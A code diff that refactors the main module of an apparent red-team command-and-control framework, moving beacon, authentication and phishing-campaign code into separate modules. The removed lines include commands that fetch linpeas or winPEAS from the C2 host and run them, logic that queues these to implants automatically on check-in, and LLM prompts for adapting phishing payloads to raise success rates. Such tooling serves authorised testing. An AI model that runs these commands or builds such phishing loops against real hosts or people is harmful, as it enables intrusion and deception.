@@ -2,7 +2,6 @@ import base64
 import csv
 import dataclasses
 import errno
-import fcntl
 import glob
 import hashlib
 import hmac
@@ -10,19 +9,15 @@ import html
 import json
 import logging
 import os
-import pty
 import re
 import secrets
-import select
 import signal
 import socket
 import sqlite3
 import stat
 import string
-import struct
 import subprocess
 import sys
-import termios
 import threading
 import time
 import uuid
@@ -38,14 +33,12 @@ from urllib.parse import urlparse
 import markdown
 import requests
 import validators
-import yagmail
 import yaml
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from dnslib import CAA, CNAME, MX, NS, QTYPE, RR, SOA, SSHFP, TLSA, TXT, A
 from dnslib.server import BaseResolver, DNSServer
 from flask import (
-    Blueprint,
     Flask,
     Response,
     abort,
@@ -86,6 +79,19 @@ from core.hardening import (
 )
 from core.hardening import (
     store_secret_owner_only as _store_secret_owner_only,
+)
+from lazyc2.phishing.campaigns import init_campaigns_bp, phishing_bp
+from lazyc2.phishing.paths import (
+    DB_PATH,
+    TEMPLATES_DIR,
+    ensure_storage,
+)
+from lazyc2.phishing.short_urls_store import load_short_urls, save_short_urls
+from lazyc2.security.auth import (
+    check_auth,
+    requires_auth,
+    requires_auth_or_session,
+    set_boot_credentials,
 )
 from lazyc2.security.cli_credentials import register_cli_user as _register_cli_user
 from lazyc2.security.cli_credentials import resolve_boot_credentials as _resolve_boot_credentials
@@ -143,7 +149,6 @@ from modules.llm_adapter import (
     process_prompt_vuln,
     safe_groq_client,
 )
-from modules.llm_orchestrator import complete_with_fallback
 from modules.logging_config import configure as _configure_logging
 from modules.metrics import REGISTRY
 from modules.security_sanitizers import (
@@ -448,8 +453,6 @@ def _resolve_bind_address(
 
     return loopback_fallback
 
-
-phishing_bp = Blueprint("phishing", __name__, template_folder="templates/phishing")
 
 if config.enable_c2_debug:
     _configure_logging(level=logging.INFO, log_dir="sessions", console=True, file=True)
@@ -1265,72 +1268,91 @@ def datetime_now_iso() -> str:
     return datetime.now(timezone.utc).isoformat()
 
 
-def _secure_command_queue_path(client_id: str) -> str:
-    """Return a sanitised, path-confined command queue file path for a beacon.
+def _beacon_store():
+    """Return the beacon storage contract bound to the active C2 directory.
 
-    Sanitises the client_id, builds the queue path relative to ALLOWED_DIRECTORY,
-    and verifies via os.path.realpath that the resolved path does not escape the
-    allowed base directory.
+    Returns:
+        A :class:`lazyc2.beacons.BeaconStore` over ``ALLOWED_DIRECTORY``.
+    """
+    from lazyc2.beacons import BeaconStore
+
+    return BeaconStore(Path(ALLOWED_DIRECTORY))
+
+
+def _beacon_runtime():
+    """Return the beacon service runtime bound to the active module state.
+
+    Returns:
+        A :class:`lazyc2.beacons.service.BeaconRuntime` carrying the C2
+        config, working directories, shared beacon state and crypto
+        helpers so the service never imports ``lazyc2``.
+    """
+    from lazyc2.beacons.service import BeaconRuntime
+
+    return BeaconRuntime(
+        config=config,
+        base_dir=BASE_DIR,
+        sessions_dir=SESSIONS_DIR,
+        allowed_directory=ALLOWED_DIRECTORY,
+        connected_clients=connected_clients,
+        bsb_clients=_bsb_beacon_clients,
+        results=results,
+        pending_commands=commands,
+        store=_beacon_store(),
+        debug_log=logger,
+        now_fn=datetime_now_iso,
+        signature_guard=_beacon_signature_guard,
+        decrypt_payload=decrypt_data,
+        current_aes_key=_current_aes_key,
+        encrypt_for=_encrypt_command_for,
+        sanitize_id=sanitize_client_id,
+        sanitize_csv_field=_sanitize_csv_field,
+    )
+
+
+def _beacon_service():
+    """Return the lazily imported beacon service module.
+
+    Returns:
+        The :mod:`lazyc2.beacons.service` module (imported on demand to
+        avoid a circular import at module load time).
+    """
+    import lazyc2.beacons.service as service
+
+    return service
+
+
+def _secure_command_queue_path(client_id: str) -> str:
+    """Return the path-confined command queue file for a beacon.
 
     Args:
         client_id: Raw beacon id from the request.
 
     Returns:
-        The validated absolute real path to the cmd_<safe_id>.json queue file.
+        The validated absolute path to ``cmd_<safe_id>.json``.
 
     Raises:
         ValueError: If the sanitised client_id is empty or the resolved path
             escapes the allowed directory.
     """
-    from modules.beacon_history import sanitize_client_id
-
-    safe_id = sanitize_client_id(client_id)
-    if not safe_id:
-        raise ValueError(f"Invalid client_id after sanitization: {client_id}")
-    candidate = os.path.join(ALLOWED_DIRECTORY, f"cmd_{safe_id}.json")
-    resolved = os.path.realpath(candidate)
-    allowed = os.path.realpath(ALLOWED_DIRECTORY)
-    if not resolved.startswith(allowed + os.sep):
-        raise ValueError(f"Queue path escapes allowed directory: {resolved}")
-    return resolved
-
-
-def _beacon_records_path(client_id: str) -> str:
-    """Return the JSONL history file path for a sanitised beacon client id."""
-    from modules.beacon_history import sanitize_client_id
-
-    return os.path.join(ALLOWED_DIRECTORY, "sessions", f"{sanitize_client_id(client_id)}{'.records.jsonl'}")
-
-
-_RECON_STATE_FILENAME = "recon_state.json"
+    return str(_beacon_store().queue_path(client_id))
 
 
 def _malleable_recon_state_dir(client_id: str) -> tuple[str, str]:
     """Resolve the bounded recon-state directory and marker path.
 
     Args:
-        client_id: Sanitised beacon identifier.
+        client_id: Beacon identifier.
 
     Returns:
-        ``(state_dir, marker_path)`` where ``state_dir`` is a
-        ``sessions/<safe_id>/c2`` subdirectory and ``marker_path`` points
-        to ``recon_state.json`` inside it.
+        ``(state_dir, marker_path)`` inside the confined sessions tree.
 
     Raises:
         ValueError: If the sanitised client_id is empty or the resolved
             marker path escapes the allowed directory.
     """
-    from modules.beacon_history import sanitize_client_id
-
-    safe_id = sanitize_client_id(client_id)
-    if not safe_id:
-        raise ValueError(f"Invalid client_id after sanitization: {client_id}")
-    state_dir = os.path.join(ALLOWED_DIRECTORY, "sessions", safe_id, "c2")
-    marker = os.path.realpath(os.path.join(state_dir, _RECON_STATE_FILENAME))
-    allowed = os.path.realpath(ALLOWED_DIRECTORY)
-    if not marker.startswith(allowed + os.sep):
-        raise ValueError(f"Recon state path escapes allowed directory: {marker}")
-    return state_dir, marker
+    store = _beacon_store()
+    return str(store.recon_state_dir(client_id)), str(store.recon_state_path(client_id))
 
 
 def _load_malleable_recon_state(client_id: str) -> dict:
@@ -1342,16 +1364,7 @@ def _load_malleable_recon_state(client_id: str) -> dict:
     Returns:
         The stored marker dict, or an empty dict when unavailable.
     """
-    try:
-        _state_dir, marker = _malleable_recon_state_dir(client_id)
-        if os.path.isfile(marker):
-            with open(marker, encoding="utf-8") as handle:
-                data = json.load(handle)
-                if isinstance(data, dict):
-                    return data
-    except (OSError, json.JSONDecodeError, ValueError) as exc:
-        logging.debug("[beacon_recon] markers load failed: %s", exc)
-    return {}
+    return _beacon_store().load_recon_state(client_id)
 
 
 def _save_malleable_recon_state(client_id: str, state: dict) -> bool:
@@ -1364,15 +1377,7 @@ def _save_malleable_recon_state(client_id: str, state: dict) -> bool:
     Returns:
         True when the marker file was written.
     """
-    try:
-        state_dir, marker = _malleable_recon_state_dir(client_id)
-        os.makedirs(state_dir, exist_ok=True)
-        with open(marker, "w", encoding="utf-8") as handle:
-            json.dump(state, handle)
-        return True
-    except (OSError, ValueError) as exc:
-        logging.debug("[beacon_recon] markers save failed: %s", exc)
-        return False
+    return _beacon_store().save_recon_state(client_id, state)
 
 
 def _enqueue_malleable_command(client_id: str, command: str) -> bool:
@@ -1385,29 +1390,11 @@ def _enqueue_malleable_command(client_id: str, command: str) -> bool:
     Returns:
         True when the queue file was written.
     """
-    try:
-        queue_path = _secure_command_queue_path(client_id)
-        os.makedirs(os.path.dirname(queue_path), exist_ok=True)
-        _cmds: list = []
-        if os.path.isfile(queue_path):
-            with open(queue_path, encoding="utf-8") as handle:
-                _cmds = json.load(handle)
-        if not isinstance(_cmds, list):
-            _cmds = []
-        _cmds.append(command)
-        with open(queue_path, "w", encoding="utf-8") as handle:
-            json.dump(_cmds, handle)
-        return True
-    except (OSError, json.JSONDecodeError, ValueError) as exc:
-        logging.debug("[beacon_recon] queue append failed: %s", exc)
-        return False
+    return _beacon_store().enqueue(client_id, command)
 
 
 def _append_beacon_record(record: dict) -> bool:
     """Append one beacon result record to the persistent JSONL history.
-
-    Keeps the full command/result timeline for a beacon so both the Flask
-    GUI and GUI2 can replay history instead of only the latest result.
 
     Args:
         record: The normalised beacon record dict (already sanitised).
@@ -1415,26 +1402,11 @@ def _append_beacon_record(record: dict) -> bool:
     Returns:
         True when the append succeeded, False otherwise.
     """
-    cid = str(record.get("client_id", ""))
-    if not cid:
-        return False
-    try:
-        from modules.beacon_history import append_record
-
-        return append_record(record)
-    except Exception:
-        try:
-            safe = _beacon_records_path(cid)
-            os.makedirs(os.path.dirname(safe), exist_ok=True)
-            with open(safe, "a", encoding="utf-8") as fh:
-                fh.write(json.dumps(record, ensure_ascii=False) + "\n")
-            return True
-        except Exception:
-            return False
+    return _beacon_store().append_record(record)
 
 
 def _read_beacon_records(client_id: str) -> list[dict]:
-    """Read the ordered JSONL history for a sanitised beacon client id.
+    """Read the ordered JSONL history for a beacon client id.
 
     Args:
         client_id: The beacon id used to locate its history file.
@@ -1442,41 +1414,7 @@ def _read_beacon_records(client_id: str) -> list[dict]:
     Returns:
         A list of record dicts in chronological order (oldest first).
     """
-    try:
-        from modules.beacon_history import read_records
-
-        return read_records(client_id)
-    except Exception:
-        path = _beacon_records_path(client_id)
-        records: list[dict] = []
-        if not os.path.isfile(path):
-            return records
-        try:
-            with open(path, "r", encoding="utf-8") as fh:
-                for line in fh:
-                    line = line.strip()
-                    if not line:
-                        continue
-                    try:
-                        records.append(json.loads(line))
-                    except json.JSONDecodeError:
-                        continue
-        except Exception:
-            pass
-        return records
-    try:
-        with open(path, "r", encoding="utf-8") as fh:
-            for line in fh:
-                line = line.strip()
-                if not line:
-                    continue
-                try:
-                    records.append(json.loads(line))
-                except json.JSONDecodeError:
-                    continue
-    except Exception as exc:
-        logging.warning("[c2] beacon history read failed: %s", exc)
-    return records
+    return _beacon_store().read_records(client_id)
 
 
 def escape_js_string(value):
@@ -1489,62 +1427,6 @@ def escape_js_string(value):
 
 
 from core.parsers import strip_ansi  # noqa: E402
-
-
-def check_auth(username: str, password: str) -> bool:
-    """Verify credentials. Checks RBACStore first, falls back to CLI creds."""
-    if not username or not password:
-        return False
-    if _RBAC_AVAILABLE:
-        store = get_rbac_store()
-        user = store.find_by_username(username)
-        if user and check_password_hash(user.password_hash, password):
-            return True
-        if hmac.compare_digest(username, USERNAME) and hmac.compare_digest(password, PASSWORD):
-            return True
-        return False
-    return hmac.compare_digest(username, USERNAME) and hmac.compare_digest(password, PASSWORD)
-
-
-def authenticate():
-    """Requests authentication."""
-    return Response(
-        "Invalid credentials. Please provide valid username and password.\n",
-        401,
-        {"WWW-Authenticate": 'Basic realm="Login Required"'},
-    )
-
-
-def requires_auth_or_session(f):
-    """Require Basic auth credentials or a valid Flask-Login session.
-
-    Used on endpoints that are driven both by the CLI (which sends HTTP
-    Basic credentials) and by the GUI dashboard deep the operator has
-    already authenticated through ``/login`` (session cookie). Either
-    channel satisfies the gate.
-    """
-
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if auth and check_auth(auth.username, auth.password):
-            return f(*args, **kwargs)
-        if current_user.is_authenticated:
-            return f(*args, **kwargs)
-        return authenticate()
-
-    return decorated
-
-
-def requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if not auth or not check_auth(auth.username, auth.password):
-            return authenticate()
-        return f(*args, **kwargs)
-
-    return decorated
 
 
 def _csrf_enabled() -> bool:
@@ -2164,29 +2046,6 @@ def decrypt_data(encrypted_data, is_file=False):
         return decrypted_data.decode("utf-8")
 
 
-def set_winsize(fd, row, col, xpix=0, ypix=0):
-    """Configura el tamaño de la terminal"""
-    winsize = struct.pack("HHHH", row, col, xpix, ypix)
-    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
-
-
-def read_and_forward_pty_output():
-    """Lectura continua del PTY y envío por WebSocket"""
-    max_read_bytes = 1024 * 20
-    while True:
-        socketio.sleep(0.01)
-        if app.config["fd"]:
-            try:
-                timeout_sec = 0
-                (data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
-                if data_ready:
-                    output = os.read(app.config["fd"], max_read_bytes)
-                    if output:
-                        socketio.emit("pty-output", {"output": output.decode(errors="replace")}, namespace="/pty")
-            except Exception:
-                logger.error("Error leyendo salida:")
-
-
 def get_discovered_hosts():
     """
     Reads the sessions/hostsdiscovery.txt file and returns a list of discovered hosts.
@@ -2380,94 +2239,6 @@ def save_to_log(data):
         return {"error": "Log save failed"}, 500
 
 
-def parse_access_log_for_short_url(short_url):
-    """Parse access.log for entries matching the given short URL."""
-    download_events = []
-    log_pattern = re.compile(
-        r"(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3}) - INFO - Short URL (.+?) accessed by (.+?) with (.+)"
-    )
-    try:
-        with open("sessions/access.log", "r") as f:
-            for line in f:
-                match = log_pattern.match(line.strip())
-                if match and match.group(2) == short_url:
-                    timestamp, short_url, ip, user_agent = match.groups()
-                    download_events.append(
-                        {"short_url": short_url, "ip": ip, "user_agent": user_agent, "timestamp": timestamp}
-                    )
-    except FileNotFoundError:
-        logging.error("access.log not found")
-    except Exception:
-        logging.error(f"Error parsing access.log: {str('')}")
-    return download_events
-
-
-def parse_execution_log(implante):
-    """Parse execution log for the given implante, returning execution events."""
-    execution_events = []
-    log_file = os.path.join(SESSIONS_DIR, f"{implante}.log")
-    if not os.path.exists(log_file):
-        logging.warning(f"Execution log not found: {log_file}")
-        return execution_events
-    with open(log_file, "r") as f:
-        reader = csv.DictReader(f)
-        for row in reader:
-            execution_events.append(
-                {
-                    "client_id": row["client_id"],
-                    "os": row["os"],
-                    "pid": row["pid"],
-                    "hostname": row["hostname"],
-                    "ips": row["ips"],
-                    "user": row["user"],
-                    "command": row["command"],
-                    "output": row["output"].strip(),
-                    "timestamp": datetime.now().isoformat(),
-                }
-            )
-    return execution_events
-
-
-def load_implant_config(implante):
-    """Load implant configuration from JSON file."""
-    config_file = os.path.join(SESSIONS_DIR, f"implant_config_{implante}.json")
-    if not os.path.exists(config_file):
-        logging.warning(f"Implant config not found: {config_file}")
-        return {}
-    with open(config_file, "r") as f:
-        return json.load(f)
-
-
-def load_short_urls():
-    """Load short URLs from JSON file, creating it if it doesn't exist."""
-    if not os.path.exists(SHORT_URLS_FILE):
-        try:
-            with open(SHORT_URLS_FILE, "w") as f:
-                json.dump({}, f)
-        except Exception:
-            logging.error(f"Failed to create short_urls.json: {str('')}")
-            raise
-    try:
-        with open(SHORT_URLS_FILE, "r") as f:
-            return json.load(f)
-    except json.JSONDecodeError:
-        logging.error(f"Failed to parse short_urls.json: {str('')}")
-        return {}
-    except Exception:
-        logging.error(f"Error reading short_urls.json: {str('')}")
-        raise
-
-
-def save_short_urls(data):
-    """Save short URLs to JSON file."""
-    try:
-        with open(SHORT_URLS_FILE, "w") as f:
-            json.dump(data, f, indent=2)
-    except Exception:
-        logging.error(f"Failed to save short_urls.json: {str('')}")
-        raise
-
-
 def is_valid_url(url):
     """Validate if the input is a valid URL or existing local file path."""
     import logging
@@ -2544,115 +2315,6 @@ def is_valid_url(url):
 
     logging.warning(f"Invalid URL or file path: {url}")
     return False
-
-
-_BEHAVIOR_SYSTEM_PROMPT = (
-    "You are a phishing simulation risk analyzer. Reply with a single integer risk score from 0 to 100."
-)
-
-
-def _behavioral_risk_prompt(event):
-    """Render the risk-scoring prompt for one behavioral event.
-
-    Args:
-        event: Behavioral event mapping with event metadata.
-
-    Returns:
-        Prompt text asking for a single integer risk score.
-    """
-    return f"""
-        Analyze the following user interaction:
-        - Event: {event["event_type"]}
-        - IP: {event["ip"]}
-        - User Agent: {event["user_agent"]}
-        - Behavior Data: {event["behavior_data"]}
-        - Timestamp: {event["timestamp"]}
-        Determine a risk score (0-100) based on suspicious behavior (e.g., rapid clicks, unusual IPs).
-        """
-
-
-def analyze_behavioral_data(behavioral_events):
-    """Analyze behavioral events using the orchestrator LLM chain.
-
-    The lazy_orchestrator failover chain serves each risk score, so a
-    missing Groq key or an exhausted quota degrades to the next chain
-    member instead of disabling the analysis.
-
-    Args:
-        behavioral_events: Behavioral event mappings from the tracking DB.
-
-    Returns:
-        Per-event risk scores; empty when no chain member answers.
-    """
-    analysis_results = []
-    for event in behavioral_events:
-        result = complete_with_fallback(
-            _behavioral_risk_prompt(event),
-            system=_BEHAVIOR_SYSTEM_PROMPT,
-            max_tokens=100,
-        )
-        if not result.ok:
-            return analysis_results if analysis_results else []
-        risk_score = int(result.text.strip()) if result.text.strip().isdigit() else 50
-        analysis_results.append({"email": event["email"], "event_type": event["event_type"], "risk_score": risk_score})
-    return analysis_results
-
-
-_CAMPAIGN_SYSTEM_PROMPT = (
-    "You are an AI assistant analyzing an ethical phishing campaign simulation. "
-    "Reply only with the requested JSON object."
-)
-
-
-def _campaign_adaptation_prompt(campaign_id, events):
-    """Render the adaptation prompt for a campaign progress check.
-
-    Args:
-        campaign_id: Campaign identifier.
-        events: Tracked interaction events.
-
-    Returns:
-        Prompt text asking for a JSON adaptation object.
-    """
-    return f"""
-    You are an AI assistant analyzing a ethic phishing campaign simulation. Given the campaign ID {campaign_id} with events: {json.dumps(events)}.
-    Suggest adaptations (e.g., change vector, payload, URL) to improve success rate.
-    **Important**: Return your response as a valid JSON object with the following structure:
-    ```json
-    Return JSON: ```json{{ "vector": str, "payload": str, "short_url": str }}```
-    """
-
-
-def analyze_campaign_progress(campaign_id, events):
-    """Analyze campaign progress using the orchestrator LLM chain.
-
-    The lazy_orchestrator failover chain proposes the adaptation, so a
-    missing Groq key or an exhausted quota degrades to the next chain
-    member instead of disabling the orchestration route.
-
-    Args:
-        campaign_id: Campaign identifier.
-        events: Tracked interaction events.
-
-    Returns:
-        Adaptation mapping with vector, payload and short_url keys;
-        empty when no chain member answers with valid JSON.
-    """
-    result = complete_with_fallback(
-        _campaign_adaptation_prompt(campaign_id, events),
-        system=_CAMPAIGN_SYSTEM_PROMPT,
-        max_tokens=200,
-    )
-    if not result.ok:
-        return {}
-    candidate = clean_json(result.text.strip())
-    if not candidate:
-        candidate = result.text.strip()
-    try:
-        parsed = json.loads(candidate)
-    except (json.JSONDecodeError, ValueError):
-        return {}
-    return parsed if isinstance(parsed, dict) else {}
 
 
 SAVE_DIR = "sessions/captured_images"
@@ -3158,13 +2820,8 @@ if _RUN_MAIN:
 DATA_FILE = BASE_DIR + "surface_attack.json"
 LOG_DIR = os.path.join("sessions", "logs", "c2")
 LOG_FILE = os.path.join(LOG_DIR, "log_c2.txt")
-CAMPAIGNS_DIR = os.path.join(os.getcwd(), "sessions", "phishing", "campaigns")
-TEMPLATES_DIR = os.path.join(os.getcwd(), "templates", "phishing", "emails")
-DB_PATH = os.path.join(os.getcwd(), "sessions", "phishing", "tracking.db")
 GMAIL_ADDRESS = config.email_username
 GMAIL_APP_PASSWORD = config.email_password
-SESSIONS_PHISHING_DIR = os.path.join(os.getcwd(), "sessions", "phishing", "campaigns")
-SHORT_URLS_FILE = SESSIONS_PHISHING_DIR + "/short_urls.json"
 SESSIONS_DIR = os.path.join(os.getcwd(), "sessions")
 if _RBAC_AVAILABLE:
     _tm = get_tenant_manager()
@@ -3192,35 +2849,12 @@ BINARY_HEADERS = [
 
 
 os.makedirs(LOG_DIR, exist_ok=True)
-os.makedirs(CAMPAIGNS_DIR, exist_ok=True)
-os.makedirs(TEMPLATES_DIR, exist_ok=True)
-conn = sqlite3.connect(DB_PATH)
-
-conn.execute("""CREATE TABLE IF NOT EXISTS tracking
-                (campaign_id TEXT, email TEXT, event TEXT, ip TEXT, timestamp TEXT)""")
-conn.commit()
-conn.execute("""CREATE TABLE IF NOT EXISTS behavioral_tracking (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    campaign_id TEXT,
-    short_url TEXT,
-    email TEXT,
-    event_type TEXT,
-    ip TEXT,
-    user_agent TEXT,
-    timestamp TEXT,
-    behavior_data TEXT
-)""")
-conn.commit()
-conn.execute("""CREATE TABLE IF NOT EXISTS multivector_tracking (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    campaign_id TEXT,
-    email TEXT,
-    event_type TEXT,
-    ip TEXT,
-    timestamp TEXT
-)""")
-conn.commit()
-conn.close()
+ensure_storage()
+init_campaigns_bp(
+    gmail_address=GMAIL_ADDRESS,
+    gmail_app_password=GMAIL_APP_PASSWORD,
+    sessions_dir_fn=lambda: SESSIONS_DIR,
+)
 
 AES_KEY_SIZE_BYTES = _AES_KEY_SIZE_BYTES
 _AES_KEY_PATH = Path(path) / "sessions" / "key.aes"
@@ -3281,6 +2915,7 @@ if _RUN_MAIN and len(sys.argv) > 3:
     elif cred_action == "rotated_on_boot":
         print("[+] rotate_c2_creds_on_boot is enabled: fresh operator credentials generated for this run")
 
+    set_boot_credentials(USERNAME, PASSWORD)
     print(f"[+] C2 operator credentials for this run (user: {USERNAME})")
     print(f"    Username: {USERNAME}")
     print(f"    Password: {PASSWORD}")
@@ -3593,149 +3228,19 @@ def _encrypt_command_for(client_id: str, command: bytes) -> str:
 @app.route(f"{route_malleable}<client_id>", methods=["GET"])
 @limiter.exempt
 def send_command(client_id):
-    _signature_error = _beacon_signature_guard()
-    if _signature_error is not None:
-        return _signature_error
-    _was_new_for_kc = client_id not in connected_clients
-    connected_clients.add(client_id)
+    """Serve the next queued command to one beacon.
 
-    if _was_new_for_kc:
-        try:
-            _kc_records = _read_beacon_records(client_id)
-            _platform = "linux"
-            _primary_ip = ""
-            if _kc_records:
-                _last = _kc_records[-1]
-                _platform = str(_last.get("client", "linux")).lower()
-                if "win" in _platform or "windows" in _platform:
-                    _platform = "windows"
-                else:
-                    _platform = "linux"
-                _raw_ips = str(_last.get("ips", ""))
-                _primary_ip = _raw_ips.split(",")[0].strip().strip("[]'\"") if _raw_ips else ""
-            if not _primary_ip:
-                _primary_ip = str(client_id)
-            from modules.world_model import HostState as _HS
-            from modules.world_model import get_world_model as _get_wm
+    Delegates to :func:`lazyc2.beacons.service.send_command` over the
+    active runtime. Kept as a thin adapter so tests can keep
+    monkeypatching ``lazyc2.send_command``.
 
-            _wm = _get_wm()
-            _wm.advance_host(_primary_ip, _HS.EXPLOITED)
-            _wm.add_note(_primary_ip, f"Foothold via beacon {client_id}")
-            from modules.killchain import KillChain as _KC
+    Args:
+        client_id: Beacon client id from the poll path.
 
-            _KC.advance_phase("exploit", host=_primary_ip)
-            _KC.advance_phase("privesc", host=_primary_ip)
-            logging.info("[killchain] Phase advanced to privesc via beacon GET %s", client_id)
-            if bool(getattr(config, "auto_privesc_on_checkin", False)):
-                _privesc_cmd = _build_privesc_command(_platform)
-                if _privesc_cmd:
-                    _queue_path = _secure_command_queue_path(client_id)
-                    _cmds = []
-                    if os.path.isfile(_queue_path):
-                        with open(_queue_path) as _qf:
-                            _cmds = json.load(_qf)
-                    if _privesc_cmd not in _cmds:
-                        _cmds.append(_privesc_cmd)
-                        with open(_queue_path, "w") as _qf:
-                            json.dump(_cmds, _qf)
-                        logging.info(
-                            "[privesc] Queued %s for %s on first GET",
-                            "linpeas" if _platform == "linux" else "winpeas",
-                            client_id,
-                        )
-        except Exception as _kc_exc:
-            logging.debug("[killchain] GET advance failed: %s", _kc_exc)
-
-    if client_id in commands:
-        command = commands.pop(client_id)
-        encrypted_command = _encrypt_command_for(client_id, command.encode())
-        return Response(encrypted_command)
-    else:
-        try:
-            cmd_queue_file_real = _secure_command_queue_path(client_id)
-        except ValueError:
-            logging.info("Rejected invalid client_id in send_command")
-            encrypted_response = _encrypt_command_for(client_id, b"")
-            return Response(encrypted_response, mimetype="application/octet-stream")
-
-        if os.path.isfile(cmd_queue_file_real):
-            try:
-                with open(cmd_queue_file_real, "r") as f:
-                    cmds = json.load(f)
-                if cmds:
-                    command = cmds.pop(0)
-                    with open(cmd_queue_file_real, "w") as f:
-                        json.dump(cmds, f)
-                    encrypted_command = _encrypt_command_for(client_id, command.encode())
-                    return Response(encrypted_command)
-            except (OSError, ValueError, json.JSONDecodeError):
-                pass
-        logging.info(f"No command for client {client_id}")
-        encrypted_response = _encrypt_command_for(client_id, b"")
-        return Response(encrypted_response, mimetype="application/octet-stream")
-
-
-LINPEAS_CANDIDATES = (
-    "/usr/share/peass/linpeas/linpeas.sh",
-    "external/.exploit/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh",
-    "external/linpeas.sh",
-)
-WINPEAS_CANDIDATES = (
-    "/usr/share/peass/winpeas/winPEASx64.exe",
-    "/usr/share/peass/winpeas/winPEASx86.exe",
-    "/usr/share/peass/winpeas/winPEASany.exe",
-    "external/.exploit/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASx64.exe",
-    "external/winPEASx64.exe",
-)
-
-
-def _try_copy_privesc_tool(platform: str) -> str | None:
-    """Copy linpeas/winpeas to sessions/ from known local paths.
-
-    Returns the destination filename when successful, None otherwise.
+    Returns:
+        The encrypted-command response.
     """
-    _candidates = LINPEAS_CANDIDATES if platform == "linux" else WINPEAS_CANDIDATES
-    for _src in _candidates:
-        if os.path.isfile(_src):
-            _dest = os.path.join(SESSIONS_DIR, os.path.basename(_src))
-            if not os.path.exists(_dest):
-                try:
-                    import shutil
-
-                    shutil.copy2(_src, _dest)
-                except OSError:
-                    continue
-            return os.path.basename(_src)
-    return None
-
-
-def _build_privesc_command(platform: str) -> str | None:
-    """Build the download+execute command for linpeas (Linux) or winpeas (Windows).
-
-    Tries to copy the tool locally first, then constructs a command that
-    downloads from the C2 server with a public GitHub fallback.
-    """
-    _lhost = str(getattr(config, "lhost", "127.0.0.1"))
-    _c2_port = str(getattr(config, "c2_port", "443"))
-    _base = f"https://{_lhost}:{_c2_port}"
-
-    if platform == "linux":
-        _try_copy_privesc_tool("linux")
-        return (
-            f"(curl -sk {_base}/s/linpeas.sh 2>/dev/null || "
-            f"curl -sSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh 2>/dev/null) "
-            f"| sh 2>&1"
-        )
-
-    if platform == "windows":
-        _fname = _try_copy_privesc_tool("windows") or "winPEASx64.exe"
-        return (
-            f"$wp=Join-Path $env:TEMP '{_fname}'; "
-            f"try{{iwr -Uri '{_base}/s/{_fname}' -OutFile $wp 2>$null}}catch{{}}; "
-            f"if(Test-Path $wp){{& $wp 2>&1}}"
-        )
-
-    return None
+    return _beacon_service().send_command(_beacon_runtime(), client_id)
 
 
 def _beacon_signature_guard() -> tuple[Response, int] | None:
@@ -3791,568 +3296,19 @@ def _beacon_signature_guard() -> tuple[Response, int] | None:
 @app.route(f"{route_malleable}<client_id>", methods=["POST"])
 @limiter.exempt
 def receive_result(client_id):
-    _signature_error = _beacon_signature_guard()
-    if _signature_error is not None:
-        return _signature_error
-    try:
-        logging.info(f"Receiving result from client {client_id}")
-        encrypted_data = request.get_data()
-        data = None
-        try:
-            data = json.loads(decrypt_data(encrypted_data))
-        except Exception:
-            data = None
-        if not isinstance(data, dict):
-            # BlackSandBeacon protocol: HKDF-derived key + replay envelope.
-            from modules.bsb_compat import decrypt_bsb_report
-
-            data, _bsb_counter, _bsb_ts = decrypt_bsb_report(encrypted_data, _current_aes_key())
-            _bsb_beacon_clients.add(str(client_id))
-            logging.info(f"BSB report from {client_id} (counter={_bsb_counter})")
-        if client_id not in connected_clients:
-            connected_clients.add(client_id)
-            if config.enable_c2_debug:
-                logger.info(f"New client connected: {client_id}")
-        if not data or not all(
-            key in data
-            for key in [
-                "output",
-                "command",
-                "client",
-                "pid",
-                "hostname",
-                "ips",
-                "user",
-                "discovered_ips",
-                "result_portscan",
-                "result_pwd",
-            ]
-        ):
-            return jsonify({"status": "error", "message": "Invalid data format"}), 400
-
-        output = data["output"]
-        client = data["client"]
-        pid = data["pid"]
-        hostname = data["hostname"]
-        ips = data["ips"]
-        user = data["user"]
-        discovered_ips = data["discovered_ips"]
-        result_portscan = data["result_portscan"]
-        result_pwd = data["result_pwd"]
-        command = data["command"]
-
-        if not all([command, output, client_id]):
-            return jsonify({"status": "error", "message": "Required fields cannot be empty"}), 400
-
-        if not isinstance(client_id, str):
-            return jsonify({"status": "error", "message": "Invalid client_id type"}), 400
-
-        sanitized_client_id = sanitize_client_id(client_id)
-        if not sanitized_client_id or sanitized_client_id != client_id:
-            return jsonify({"status": "error", "message": "Invalid client_id format"}), 400
-
-        try:
-            allowed_directory_abs = os.path.abspath(ALLOWED_DIRECTORY)
-            filename = f"{sanitized_client_id}.log"
-            csv_file = os.path.join(allowed_directory_abs, filename)
-            csv_file_abs = os.path.abspath(csv_file)
-            if not csv_file_abs.startswith(allowed_directory_abs + os.sep):
-                return jsonify({"status": "error", "message": "Invalid file path"}), 403
-
-            if not os.access(allowed_directory_abs, os.W_OK):
-                return jsonify({"status": "error", "message": "Permission denied"}), 403
-
-        except Exception:
-            if config.enable_c2_debug:
-                logger.info("[ERROR] Path validation error")
-            return jsonify({"status": "error", "message": "Path validation error"}), 500
-
-        try:
-            file_exists = os.path.isfile(csv_file_abs)
-            with open(csv_file_abs, "a", newline="") as f:
-                writer = csv.writer(f)
-                if not file_exists:
-                    writer.writerow(
-                        [
-                            "client_id",
-                            "os",
-                            "pid",
-                            "hostname",
-                            "ips",
-                            "user",
-                            "discovered_ips",
-                            "result_portscan",
-                            "result_pwd",
-                            "command",
-                            "output",
-                        ]
-                    )
-
-                safe_data = [
-                    _sanitize_csv_field(sanitized_client_id),
-                    _sanitize_csv_field(client, maxlen=100),
-                    _sanitize_csv_field(pid, maxlen=20),
-                    _sanitize_csv_field(hostname, maxlen=100),
-                    _sanitize_csv_field(ips, maxlen=100),
-                    _sanitize_csv_field(user, maxlen=50),
-                    _sanitize_csv_field(discovered_ips, maxlen=1000),
